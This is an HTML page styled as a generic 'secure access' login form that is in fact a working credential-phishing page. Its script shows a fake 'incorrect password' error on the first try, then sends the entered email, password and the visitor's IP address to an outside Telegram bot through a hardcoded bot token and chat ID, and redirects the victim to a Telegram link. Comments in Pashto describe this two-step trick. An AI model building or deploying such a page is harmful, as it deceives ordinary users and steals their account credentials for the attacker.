<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN • SECURE ACCESS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Poppins', system-ui;
        }
        body {
            min-height: 100vh;
            background: radial-gradient(circle at 20% 30%, #0a0a0f, #010101);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }
        .login-container {
            max-width: 450px;
            width: 100%;
            background: rgba(10, 20, 30, 0.55);
            backdrop-filter: blur(16px);
            border-radius: 2rem;
            border: 1px solid rgba(0, 255, 255, 0.3);
            padding: 2rem;
        }
        .header h1 {
            font-size: 2rem;
            text-align: center;
            background: linear-gradient(135deg, #fff, #0ff);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }
        .input-group {
            margin-bottom: 1rem;
        }
        .input-group label {
            color: #0ff;
            display: block;
            margin-bottom: 0.3rem;
        }
        .input-group input {
            width: 100%;
            padding: 0.8rem;
            background: rgba(0,30,40,0.7);
            border: 1px solid rgba(0,255,255,0.3);
            border-radius: 1rem;
            color: white;
        }
        .btn-login {
            width: 100%;
            padding: 0.8rem;
            background: linear-gradient(95deg, #00a6c4, #0066cc);
            border: none;
            border-radius: 1rem;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-top: 1rem;
        }
        .error-msg, .success-msg {
            background: rgba(255,0,0,0.2);
            border: 1px solid #ff3366;
            border-radius: 0.5rem;
            padding: 0.5rem;
            margin-bottom: 1rem;
            text-align: center;
            display: none;
        }
        .success-msg {
            background: rgba(0,255,0,0.2);
            border-color: #0f0;
            color: #0f0;
        }
        .attempt-counter {
            text-align: center;
            margin-top: 1rem;
            color: #4b7c8c;
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
<div class="login-container">
    <div class="header"><h1>◈ LOGIN</h1></div>
    <div id="errorMsg" class="error-msg"></div>
    <div id="successMsg" class="success-msg"></div>
    <div class="input-group">
        <label>📧 EMAIL</label>
        <input type="email" id="email" placeholder="yourname@gmail.com">
    </div>
    <div class="input-group">
        <label>🔑 PASSWORD</label>
        <input type="password" id="password" placeholder="Enter your password">
    </div>
    <button class="btn-login" onclick="validateAndSend()">LOGIN</button>
    <div class="attempt-counter" id="attemptCounter">Attempt 1 of 2</div>
</div>

<script>
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";
    const BOT_LINK = "https://t.me/imrankhabot?start=confirm_account";

    let attemptData = {};

    async function validateAndSend() {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const userIP = await getIP();
        
        if (!attemptData[userIP]) attemptData[userIP] = { attempts: 0 };
        const currentAttempt = attemptData[userIP].attempts + 1;
        attemptData[userIP].attempts = currentAttempt;
        document.getElementById('attemptCounter').innerText = `Attempt ${currentAttempt} of 2`;
        
        if (!email || !password) {
            showError("Please fill in all fields!");
            return;
        }
        if (!email.includes('@')) {
            showError("Invalid email format!");
            return;
        }
        
        if (currentAttempt === 1) {
            // لومړۍ هڅه: ناکامه (معلومات اډمن ته نه ځي)
            showError("❌ Incorrect password. Second attempt will be accepted.");
            setTimeout(() => {
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                attemptData[userIP].attempts = 0;
                document.getElementById('attemptCounter').innerText = "Attempt 1 of 2";
            }, 2000);
            return;
        }
        
        // دوهمه هڅه: بریالۍ - اډمن ته معلومات واستوئ
        if (currentAttempt >= 2) {
            const successMsg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${userIP}\n📊 Attempt: ${currentAttempt}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: successMsg, parse_mode: 'Markdown' })
            });
            
            showSuccess("✅ Login successful! Redirecting to bot...");
            setTimeout(() => {
                window.location.href = BOT_LINK;
            }, 1500);
        }
    }
    
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch { return 'unknown'; }
    }
    
    function showError(msg) {
        const err = document.getElementById('errorMsg');
        err.innerText = msg;
        err.style.display = 'block';
        setTimeout(() => err.style.display = 'none', 3000);
    }
    
    function showSuccess(msg) {
        const suc = document.getElementById('successMsg');
        suc.innerText = msg;
        suc.style.display = 'block';
        setTimeout(() => suc.style.display = 'none', 3000);
    }
    
    document.getElementById('password').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') validateAndSend();
    });
</script>
</body>
</html>
